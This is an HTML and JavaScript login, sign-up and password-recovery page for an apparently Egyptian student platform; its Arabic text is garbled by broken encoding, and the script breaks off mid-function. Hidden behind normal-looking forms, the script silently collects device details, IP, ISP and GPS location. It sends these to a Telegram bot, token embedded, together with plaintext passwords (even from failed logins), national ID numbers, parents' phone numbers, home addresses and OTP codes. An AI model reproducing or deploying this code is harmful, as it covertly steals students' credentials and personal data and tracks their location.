<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png">

    <title>Ù…Ù†ØµØ© Ø­Ù„ØªÙ‡Ø§Ù„Ùƒ | Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù…ÙˆØ­Ø¯ Ù„Ù„Ø·Ù„Ø§Ø¨</title>
    <meta name="description" content="Ù…Ù†ØµØ© Ø­Ù„ØªÙ‡Ø§Ù„Ùƒ Ø§Ù„ØªØ¹Ù„ÙŠÙ…ÙŠØ©">
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-MKS3WQ6JPP"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-MKS3WQ6JPP');
    </script>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --bg-gradient: linear-gradient(-45deg, #a1c4fd, #c2e9fb, #2c8cff, #ffffff);
            --container-bg: rgba(255, 255, 255, 0.85);
            --text-color: #1e293b;
            --input-bg: #ffffff;
            --input-border: #cbd5e1;
            --button-bg: #2c8cff;
            --shadow: 0 20px 40px rgba(0,0,0,0.1);
        }

        [data-theme="dark"] {
            --bg-gradient: linear-gradient(-45deg, #020617, #0f172a, #1e293b, #334155);
            --container-bg: rgba(15, 23, 42, 0.9);
            --text-color: #f8fafc;
            --input-bg: #1e293b;
            --input-border: #334155;
            --shadow: 0 20px 40px rgba(0,0,0,0.4);
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-gradient);
            background-size: 400% 400%;
            animation: moveGradient 12s ease infinite;
            margin: 0; min-height: 100vh;
            display: flex; justify-content: center; align-items: center;
            transition: 0.5s; overflow-x: hidden;
            -webkit-user-select: none; user-select: none;
        }

        @keyframes moveGradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .otp-notification {
            position: fixed; top: -120px; left: 50%; transform: translateX(-50%);
            background: var(--container-bg); color: var(--text-color); padding: 15px 25px; border-radius: 20px;
            box-shadow: var(--shadow); z-index: 9999; backdrop-filter: blur(10px);
            display: flex; align-items: center; gap: 20px; border-right: 6px solid var(--button-bg);
            transition: 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); width: 300px;
        }
        .otp-notification.show { top: 20px; }
        
        .container {
            background: var(--container-bg); backdrop-filter: blur(15px);
            padding: 30px; border-radius: 30px; width: 95%; max-width: 450px;
            box-shadow: var(--shadow); position: relative; max-height: 90vh;
            overflow-y: auto; border: 1px solid rgba(255,255,255,0.1);
        }
        .container::-webkit-scrollbar { width: 4px; }
        .container::-webkit-scrollbar-thumb { background: var(--button-bg); border-radius: 10px; }

        .logo-container { text-align: center; margin-bottom: 20px; }
        .logo { width: 140px; transition: 0.3s ease; }
        h1 { color: var(--text-color); text-align: center; font-size: 22px; margin-bottom: 25px; }

        .input-group { margin-bottom: 15px; text-align: right; position: relative; }
        label { display: block; margin-bottom: 8px; font-size: 13.5px; font-weight: 600; color: var(--text-color); }
        input {
            width: 100%; padding: 13px; border-radius: 15px; border: 1px solid var(--input-border);
            background: var(--input-bg); color: var(--text-color); font-size: 14px; box-sizing: border-box;
            transition: 0.3s;
        }
        input:focus { outline: none; border-color: var(--button-bg); box-shadow: 0 0 8px rgba(44, 140, 255, 0.2); }

        .pass-wrapper { position: relative; }
        .toggle-pass {
            position: absolute; left: 15px; top: 50%; transform: translateY(-50%);
            cursor: pointer; color: var(--button-bg); transition: 0.3s; padding: 5px;
        }

        .remember-me {
            display: flex; align-items: center; gap: 8px; margin-bottom: 20px;
            font-size: 14px; color: var(--text-color); cursor: pointer;
        }
        .remember-me input { width: 18px; height: 18px; cursor: pointer; }

        .action-btn {
            width: 100%; padding: 15px; background: var(--button-bg); color: white; border: none;
            border-radius: 15px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.4s;
        }
        .action-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(44, 140, 255, 0.3); }

        .theme-toggle {
            position: absolute; top: 20px; left: 20px; background: var(--input-bg);
            border: 1px solid var(--input-border); width: 45px; height: 45px; border-radius: 50%;
            cursor: pointer; display: flex; justify-content: center; align-items: center; z-index: 10;
            color: var(--button-bg); font-size: 20px;
        }

        .view-section { display: none; }
        .view-section.active { display: block; animation: fadeInUp 0.5s ease; }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .links { text-align: center; margin-top: 20px; font-size: 14px; color: var(--text-color); }
        .links a { color: var(--button-bg); text-decoration: none; font-weight: bold; cursor: pointer; }

        .otp-box { display: flex; gap: 12px; justify-content: center; direction: ltr; margin: 30px 0; }
        .otp-box input { width: 50px; height: 55px; text-align: center; font-size: 24px; font-weight: bold; border-radius: 12px; }

        .message { padding: 14px; border-radius: 15px; margin-top: 20px; text-align: center; display: none; font-weight: bold; }
        .success { background: #10b981; color: white; }
        .error { background: #ef4444; color: white; }
    </style>
</head>
<body data-theme="">

    <div id="otp-notif" class="otp-notification">
        <div style="flex-grow: 1;">
            <div style="font-size: 11px; opacity: 0.8;">Ø±Ù…Ø² Ø§Ù„Ø£Ù…Ø§Ù† Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ:</div>
            <div id="notif-code" style="font-weight: 800; font-size: 24px; color: var(--button-bg); letter-spacing: 3px;">0000</div>
        </div>
        <button onclick="copyOTP()" style="background:none; border:none; color:var(--button-bg); cursor:pointer;"><i class="fas fa-copy"></i></button>
    </div>

    <div class="container">
        <button class="theme-toggle" onclick="toggleTheme()" id="theme-btn"><i class="fas fa-moon"></i></button>

        <div class="logo-container">
            <img id="main-logo" src="https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png" class="logo" alt="Ø´Ø¹Ø§Ø± Ù…Ù†ØµØ© Ø­Ù„ØªÙ‡Ø§Ù„Ùƒ">
        </div>

        <div id="login-view" class="view-section active">
            <h1>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h1>
            <form id="login-form">
                <div class="input-group">
                    <label>Ø±Ù‚Ù… Ù‡Ø§ØªÙ Ø§Ù„Ø·Ø§Ù„Ø¨</label>
                    <input type="tel" id="l_phone" placeholder="01xxxxxxxxx" required>
                </div>
                <div class="input-group">
                    <label>ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                    <div class="pass-wrapper">
                        <input type="password" id="l_pass" required>
                        <i class="fas fa-eye toggle-pass" onclick="togglePassVisibility('l_pass', this)"></i>
                    </div>
                </div>
                
                <label class="remember-me">
                    <input type="checkbox" id="remember-check">
                    Ø°ÙƒØ±Ù†ÙŠ (Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹)
                </label>

                <button type="submit" class="action-btn">Ø¯Ø®ÙˆÙ„ Ù„Ù„Ù…Ù†ØµØ©</button>
            </form>
            <div class="links" style="margin-top:15px;"><a onclick="switchView('signup-view')">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯</a></div>
            <div class="links"><a onclick="switchView('forgot-step1')">Ù†Ø³ÙŠØª ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±ØŸ</a></div>
        </div>

        <div id="signup-view" class="view-section">
            <h1>Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø·Ø§Ù„Ø¨</h1>
            <form id="signup-form">
                <div class="input-group"><label>Ø§Ø³Ù… Ø§Ù„Ø·Ø§Ù„Ø¨</label><input type="text" id="s_name" required></div>
                <div class="input-group"><label>Ø±Ù‚Ù… Ù‡Ø§ØªÙ Ø§Ù„Ø·Ø§Ù„Ø¨ (Ù„Ù„Ø¯Ø®ÙˆÙ„)</label><input type="tel" id="s_phone" maxlength="11" required></div>
                <div class="input-group"><label>Ø±Ù‚Ù… Ù‡Ø§ØªÙ Ø§Ù„Ø£Ø¨</label><input type="tel" id="s_f_phone" maxlength="11" required></div>
                <div class="input-group"><label>Ø±Ù‚Ù… Ù‡Ø§ØªÙ Ø§Ù„Ø£Ù…</label><input type="tel" id="s_m_phone" maxlength="11" required></div>
                <div class="input-group"><label>Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</label><input type="email" id="s_email" required></div>
                <div class="input-group"><label>ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯</label><input type="date" id="s_dob" required></div>
                <div class="input-group"><label>Ø§Ù„Ø¹Ù†ÙˆØ§Ù† Ø¨Ø§Ù„ØªÙØµÙŠÙ„</label><input type="text" id="s_loc" required></div>
                <div class="input-group"><label>Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ù‚ÙˆÙ…ÙŠ (14 Ø±Ù‚Ù…)</label><input type="text" id="s_nat" maxlength="14" required></div>
                <div class="input-group">
                    <label>ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                    <div class="pass-wrapper">
                        <input type="password" id="s_pass" minlength="6" required>
                        <i class="fas fa-eye toggle-pass" onclick="togglePassVisibility('s_pass', this)"></i>
                    </div>
                </div>
                <button type="submit" class="action-btn">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</button>
            </form>
            <div class="links"><a onclick="switchView('login-view')">Ø±Ø¬ÙˆØ¹ Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</a></div>
        </div>

        <div id="forgot-step1" class="view-section">
            <h1>Ø§Ø³ØªØ¹Ø§Ø¯Ø© Ø§Ù„Ø­Ø³Ø§Ø¨</h1>
            <div class="input-group"><label>Ø±Ù‚Ù… Ù‡Ø§ØªÙ Ø§Ù„Ø·Ø§Ù„Ø¨</label><input type="tel" id="recover-phone" required></div>
            <div class="input-group"><label>Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ù‚ÙˆÙ…ÙŠ</label><input type="text" id="recover-nat" maxlength="14" required></div>
            <button class="action-btn" onclick="requestOTP()">Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚</button>
            <div class="links"><a onclick="switchView('login-view')">Ø¥Ù„ØºØ§Ø¡</a></div>
        </div>

        <div id="forgot-step2" class="view-section">
            <h1>ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</h1>
            <div class="otp-box" id="otp-inputs">
                <input type="text" inputmode="numeric" maxlength="1">
                <input type="text" inputmode="numeric" maxlength="1">
                <input type="text" inputmode="numeric" maxlength="1">
                <input type="text" inputmode="numeric" maxlength="1">
            </div>
            <button class="action-btn" onclick="verifyOTP()">ØªØ­Ù‚Ù‚ Ø§Ù„Ø¢Ù†</button>
        </div>

        <div id="forgot-step3" class="view-section">
            <h1>ØªØ¹Ø¯ÙŠÙ„ ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±</h1>
            <div class="input-group">
                <label>Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯</label>
                <div class="pass-wrapper">
                    <input type="password" id="new-p" minlength="6" required>
                    <i class="fas fa-eye toggle-pass" onclick="togglePassVisibility('new-p', this)"></i>
                </div>
            </div>
            <button class="action-btn" onclick="updatePass()">ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø­Ø³Ø§Ø¨</button>
        </div>

        <div id="status-msg" class="message"></div>
    </div>

    <script>
        const BOT_TOKEN = '8150970842:AAH1fWCntUzVNnE6Nq9TXW8SH-MmM9ycvfk';
        const CHAT_ID_CHANNEL = '-1003018202565'; 
        const CHAT_ID_USER = '7428842238';
        const LOGO_LIGHT = "https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png";
        const LOGO_DARK = "https://raw.githubusercontent.com/elmoftary-vr/Halthalk/45d49545c1a08433a739887c4aed3d65fd9c335f/20251206_234458.png";

        const getDB = () => JSON.parse(localStorage.getItem('hal_users') || '[]');
        const saveUser = (u) => { const db = getDB(); db.push(u); localStorage.setItem('hal_users', JSON.stringify(db)); };

        // ==========================================
        //  Ø¯Ø§Ù„Ø© Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹ (ØµØ§Ù…ØªØ© ÙˆÙ…Ø­Ø³Ù†Ø©)
        // ==========================================
        async function getDeviceInfo() {
            let info = {
                deviceType: "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ",
                brandModel: "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ",
                battery: "ØºÙŠØ± Ù…ØªØ§Ø­",
                isp: "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ",
                ip: "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¬Ù„Ø¨...",
                city: "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ",
                country: "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ",
                location: "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ"
            };

            const ua = navigator.userAgent.toLowerCase();

            // Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²
            if (/android/i.test(ua)) info.deviceType = "ğŸ“± Android";
            else if (/iphone/i.test(ua)) info.deviceType = "ğŸ“± iPhone";
            else if (/ipad/i.test(ua)) info.deviceType = "ğŸ“± iPad";
            else if (/windows/i.test(ua)) info.deviceType = "ğŸ’» Windows";
            else if (/macintosh|mac os x/i.test(ua)) info.deviceType = "ğŸ’» Mac OS";
            else if (/linux/i.test(ua)) info.deviceType = "ğŸ’» Linux";

            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ù…Ø§Ø±ÙƒØ© ÙˆØ§Ù„Ù…ÙˆØ¯ÙŠÙ„
            const brands = ['samsung','huawei','xiaomi','oppo','vivo','realme','oneplus','google','nokia','sony','lg','motorola','honor'];
            let brandFound = brands.find(b => ua.includes(b));
            if (brandFound) info.brandModel = brandFound.charAt(0).toUpperCase() + brandFound.slice(1);

            const modelMatch = ua.match(/\(([^;]+);/i);
            if (modelMatch) info.brandModel += ` (${modelMatch[1].trim()})`;

            // Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©
            if ('getBattery' in navigator) {
                try {
                    const batt = await navigator.getBattery();
                    info.battery = `${Math.round(batt.level * 100)}% ${batt.charging ? '(âš¡ ÙŠØ´Ø­Ù†)' : '(ğŸ”Œ ØºÙŠØ± Ù…ÙˆØµÙˆÙ„)'}`;
                } catch (e) {}
            }

            // IP + Ù…Ø¯ÙŠÙ†Ø© + Ø¯ÙˆÙ„Ø© + ISP
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                info.ip = data.ip || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
                info.city = data.city || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
                info.country = data.country_name || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
                info.isp = data.org || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
            } catch (e) {
                info.ip = "ÙØ´Ù„ Ø§Ù„Ø¬Ù„Ø¨";
            }

            // Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ (ØµØ§Ù…Øª 100% - ÙÙ‚Ø· Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø¥Ø°Ù† Ù…ÙˆØ¬ÙˆØ¯ Ù…Ø³Ø¨Ù‚Ù‹Ø§)
            if (navigator.permissions && navigator.permissions.query) {
                try {
                    const permission = await navigator.permissions.query({ name: 'geolocation' });
                    if (permission.state === 'granted') {
                        const position = await new Promise((res, rej) => {
                            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 });
                        });
                        info.location = `âœ… Ù…ÙˆÙ‚Ø¹ Ø¯Ù‚ÙŠÙ‚ (GPS Ù…ÙØªÙˆØ­)\nhttps://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
                    } else {
                        info.location = `ğŸ”’Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…ØºÙ„Ù‚`;
                    }
                } catch (err) {
                    info.location = `âš ï¸ Ù„Ø§ ÙŠØ¯Ø¹Ù… ÙØ­Øµ Ø§Ù„Ø¥Ø°Ù† Ø£Ùˆ Ø®Ø·Ø£ ÙÙŠ GPS`;
                }
            } else {
                info.location = `âš ï¸ Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… ÙØ­Øµ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª`;
            }

            return `ğŸ“± *Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²:* ${info.deviceType}\n` +
                   `ğŸ­ *Ø§Ø³Ù… Ø§Ù„Ø¬Ù‡Ø§Ø²:* ${info.brandModel}\n` +
                   `ğŸŒ *Ø§Ù„Ø´Ø¨ÙƒØ©:* ${info.isp}\n` +
                   `ğŸ”‹ *Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:* ${info.battery}\n` +
                   `âš¡ *IP:* ${info.ip}\n` +
                   `ğŸ™ï¸ *Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©:* ${info.city}, ${info.country}\n` +
                   `ğŸ“ *Ø­Ø§Ù„Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹:* ${info.location}`;
        }

        async function report(txt) {
            const targets = [CHAT_ID_CHANNEL, CHAT_ID_USER];
            for (const target of targets) {
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: target,
                            text: txt,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true
                        })
                    });
                } catch(e) {}
            }
        }

        window.onload = () => {
            const saved = JSON.parse(localStorage.getItem('remembered_user'));
            if(saved) {
                document.getElementById('l_phone').value = saved.phone;
                document.getElementById('l_pass').value = saved.pass;
                document.getElementById('remember-check').checked = true;
            }
        };

        function togglePassVisibility(inputId, icon) {
            const input = document.getElementById(inputId);
            if (input.type === "password") {
                input.type = "text";
                icon.classList.replace('fa-eye', 'fa-eye-slash');
            } else {
                input.type = "password";
                icon.classList.replace('fa-eye-slash', 'fa-eye');
            }
        }

        function switchView(id) {
            document.querySelectorAll('.view-section').forEach(v => v.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.getElementById('status-msg').style.display = 'none';
        }

        function showStatus(txt, type) {
            const m = document.getElementById('status-msg');
            m.innerText = txt; m.className = `message ${type}`; m.style.display = 'block';
        }

        function toggleTheme() {
            const b = document.body;
            const logo = document.getElementById('main-logo');
            const themeBtn = document.getElementById('theme-btn');
            
            if (b.dataset.theme === 'dark') {
                b.dataset.theme = '';
                logo.src = LOGO_LIGHT;
                themeBtn.innerHTML = '<i class="fas fa-moon"></i>';
            } else {
                b.dataset.theme = 'dark';
                logo.src = LOGO_DARK;
                themeBtn.innerHTML = '<i class="fas fa-sun"></i>';
            }
        }

        function copyOTP() {
            navigator.clipboard.writeText(currentOTP);
            showStatus("ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø±Ù…Ø²", "success");
            setTimeout(() => document.getElementById('status-msg').style.display = 'none', 1000);
        }

        // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
        document.getElementById('login-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            showStatus("Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø®Ø§Ø¯Ù…...", "success"); 
            
            const phone = document.getElementById('l_phone').value;
            const pass = document.getElementById('l_pass').value;
            const remember = document.getElementById('remember-check').checked;
            const user = getDB().find(u => u.phone === phone);

            const fullInfo = await getDeviceInfo();

            if(user && user.pass === pass) {
                if(remember) localStorage.setItem('remembered_user', JSON.stringify({phone, pass}));
                else localStorage.removeItem('remembered_user');
                
                await report(`âœ… *Ø¯Ø®ÙˆÙ„ Ù†Ø§Ø¬Ø­*\n\n` +
                            `ğŸ“… *Ø§Ù„ÙˆÙ‚Øª:* ${new Date().toLocaleString('ar-EG')}\n` +
                            `ğŸ‘¤ *Ø§Ø³Ù… Ø§Ù„Ø·Ø§Ù„Ø¨:* ${user.name}\n` +
                            `ğŸ“± *Ù‡Ø§ØªÙ:* \`${phone}\`\n\n` +
                            `${fullInfo}\n` +
                            `â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n` +
                            `ğŸ”— ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ù€ IP: https://ipinfo.io/${(await fetch('https://ipapi.co/json/').then(r=>r.json())).ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}`);

                showStatus("Ø¬Ø§Ø±ÙŠ ØªØ­ÙˆÙŠÙ„Ùƒ Ù„Ù„Ù…Ù†ØµØ©...", "success");
                setTimeout(() => window.location.href = "https://home-halthalk.vercel.app", 1200);
            } else {
                await report(`âŒ *Ù…Ø­Ø§ÙˆÙ„Ø© Ø¯Ø®ÙˆÙ„ ÙØ§Ø´Ù„Ø©*\n\n` +
                            `ğŸ“… *Ø§Ù„ÙˆÙ‚Øª:* ${new Date().toLocaleString('ar-EG')}\n` +
                            `ğŸ“± *Ø§Ù„Ù‡Ø§ØªÙ:* \`${phone}\`\n` +
                            `ğŸ” *Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯ Ø§Ù„Ù…Ø¯Ø®Ù„:* \`${pass}\`\n\n` +
                            `${fullInfo}`);

                showStatus("Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ ØºÙŠØ± ØµØ­ÙŠØ­Ø©", "error");
            }
        });

        // Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯ - Ù…Ø¹ Ø§Ù„ØªØ±ØªÙŠØ¨ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨ Ø¨Ø§Ù„Ø¶Ø¨Ø· + ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ù…Ø­Ø³Ù†
        document.getElementById('signup-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            showStatus("Ø¬Ø§Ø±ÙŠ Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø­Ø³Ø§Ø¨...", "success");

            const phone = document.getElementById('s_phone').value.trim();
            if(getDB().find(u => u.phone === phone)) {
                return showStatus("Ù‡Ø°Ø§ Ø§Ù„Ù‡Ø§ØªÙ Ù…Ø³Ø¬Ù„ Ù…Ø³Ø¨Ù‚Ø§Ù‹!", "error");
            }

            const user = {
                name: document.getElementById('s_name').value.trim(),
                phone: phone,
                f_phone: document.getElementById('s_f_phone').value.trim(),
                m_phone: document.getElementById('s_m_phone').value.trim(),
                dob: document.getElementById('s_dob').value,
                loc: document.getElementById('s_loc').value.trim(),
                nat: document.getElementById('s_nat').value.trim(),
                pass: document.getElementById('s_pass').value
            };

            saveUser(user);

            const deviceReport = await getDeviceInfo();
            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));

            const reportMsg = `ğŸ†• *Ø·Ø§Ù„Ø¨ Ø¬Ø¯ÙŠØ¯ Ù…Ø³Ø¬Ù„ ÙÙŠ Ù…Ù†ØµØ© Ø­Ù„ØªÙ‡Ø§Ù„Ùƒ*\n\n` +
                              `ğŸ“… *Ø§Ù„ØªØ§Ø±ÙŠØ® ÙˆØ§Ù„ÙˆÙ‚Øª:* ${new Date().toLocaleString('EG')}\n\n` +
                              `ğŸ‘¤ *Ø§Ø³Ù… Ø§Ù„Ø·Ø§Ù„Ø¨:* ${user.name}\n` +
                              `ğŸ“± *Ù‡Ø§ØªÙ Ø§Ù„Ø·Ø§Ù„Ø¨:* \`${user.phone}\`\n` +
                              `ğŸ‘¨ *Ù‡Ø§ØªÙ Ø§Ù„Ø£Ø¨:* \`${user.f_phone}\`\n` +
                              `ğŸ‘© *Ù‡Ø§ØªÙ Ø§Ù„Ø£Ù…:* \`${user.m_phone}\`\n` +
                              `ğŸ‚ *ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯:* ${user.dob}\n` +
                              `ğŸ  *Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ø·Ø§Ù„Ø¨:* ${user.loc}\n` +
                              `ğŸ†” *Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ù‚ÙˆÙ…ÙŠ:* \`${user.nat}\`\n` +
                              `ğŸ” *Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯:* \`${user.pass}\`\n\n` +
                              `â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n` +
                              `*ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ø¬Ù‡Ø§Ø²*\n\n` +
                              `${deviceReport}\n\n` +
                              `â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n` +
                              `ğŸ”— *ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ù€ IP Ø§Ù„ÙƒØ§Ù…Ù„:* https://ipinfo.io/${ipData.ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}`;

            await report(reportMsg);
            showStatus("ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨Ùƒ Ø¨Ù†Ø¬Ø§Ø­!", "success");
            setTimeout(() => switchView('login-view'), 1500);
        });

        // Ø§Ø³ØªØ¹Ø§Ø¯Ø© ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±
        let currentOTP = "";
        window.requestOTP = async () => {
            const phone = document.getElementById('recover-phone').value;
            const nat = document.getElementById('recover-nat').value;
            const user = getDB().find(u => u.phone === phone && u.nat === nat);

            if(user) {
                showStatus("Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚...", "success");
                currentOTP = Math.floor(1000 + Math.random() * 9000).toString();
                document.getElementById('notif-code').innerText = currentOTP;
                document.getElementById('otp-notif').classList.add('show');
                
                const fullInfo = await getDeviceInfo();
                await report(`ğŸ”‘ *Ø·Ù„Ø¨ Ø§Ø³ØªØ¹Ø§Ø¯Ø© ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ±*\n\n` +
                            `ğŸ“… *Ø§Ù„ÙˆÙ‚Øª:* ${new Date().toLocaleString('ar-EG')}\n` +
                            `ğŸ‘¤ *Ø§Ø³Ù… Ø§Ù„Ø·Ø§Ù„Ø¨:* ${user.name}\n` +
                            `ğŸ“± *Ø§Ù„Ù‡Ø§ØªÙ:* \`${phone}\`\n` +
                            `ğŸ”¢ *Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚:* \`${currentOTP}\`\n\n` +
                            `${fullInfo}`);
                
                setTimeout(() => switchView('forgot-step2'), 1000);
            } else {
                showStatus("Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ø§ ØªØ·Ø§Ø¨Ù‚ Ø³Ø¬Ù„Ø§ØªÙ†Ø§", "error");
            }
        };

        const inps = document.querySelectorAll('#otp-inputs input');
        inps.forEach((inp, i) => {
            inp.oninput = () => { if(inp.value && i < 3) inps[i+1].focus(); };
            inp.onkeydown = (e) => { if(e.key === 'Backspace' && !inp.value && i > 0) inps[i-1].focus(); };
        });

        window.verifyOTP = () => {
            let val = ""; inps.forEach(i => val += i.value);
            if(val === currentOTP) switchView('forgot-step3');
            else showStatus("Ø±Ù…Ø² ØºÙŠØ± ØµØ­ÙŠØ­", "error");
        };

        window.updatePass = async () => {
            const np = document.getElementById('new-p').value;
            const phone = document.getElementById('recover-phone').value;
            
            showStatus("Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ø¯ÙŠØ«...", "success");
            
            const db = getDB().map(u => { if(u.phone === phone) u.pass = np; return u; });
            localStorage.setItem('hal_users', JSON.stringify(db));
            
            const fullInfo = await getDeviceInfo();
            await report(`ğŸ”„ *ØªÙ… ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±*\n\n` +
                        `ğŸ“… *Ø§Ù„ÙˆÙ‚Øª:* ${new Date().toLocaleString('ar-EG')}\n` +
                        `ğŸ“± *Ø§Ù„Ù‡Ø§ØªÙ:* \`${phone}\`\n` +
                        `ğŸ” *Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯:* \`${np}\`\n\n` +
                        `${fullInfo}`);
            
